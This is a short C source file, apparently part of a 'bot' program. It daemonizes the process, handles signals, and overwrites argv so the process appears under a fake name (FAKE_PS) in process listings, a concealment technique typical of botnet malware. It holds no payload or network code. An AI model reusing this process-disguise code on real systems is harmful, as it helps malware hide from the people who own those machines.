#include "bot.h"

#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static volatile bool g_shutdown_flag = false;
void handle_signal(int signum) {
  (void)signum;
  g_shutdown_flag = true;
}
void setup_signals(void) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = handle_signal;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = 0;
  sigaction(SIGINT, &sa, NULL);
  sigaction(SIGTERM, &sa, NULL);
  sa.sa_handler = SIG_IGN;
  sigaction(SIGPIPE, &sa, NULL);
}
void daemonize(void) {
  pid_t pid = fork();
  if (pid < 0) exit(EXIT_FAILURE);
  if (pid > 0) exit(EXIT_SUCCESS);
  if (setsid() < 0) exit(EXIT_FAILURE);
  pid = fork();
  if (pid < 0) exit(EXIT_FAILURE);
  if (pid > 0) exit(EXIT_SUCCESS);
  umask(0);
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
}

void change_proc_name(int argc, char *argv[]) {
  if (argc == 0 || argv[0] == NULL) return;

  size_t total_len = 0;
  for (int i = 0; i < argc; i++) {
    total_len += strlen(argv[i]) + 1;
  }
  memset(argv[0], 0, total_len);
  snprintf(argv[0], total_len, "%s", FAKE_PS);
}
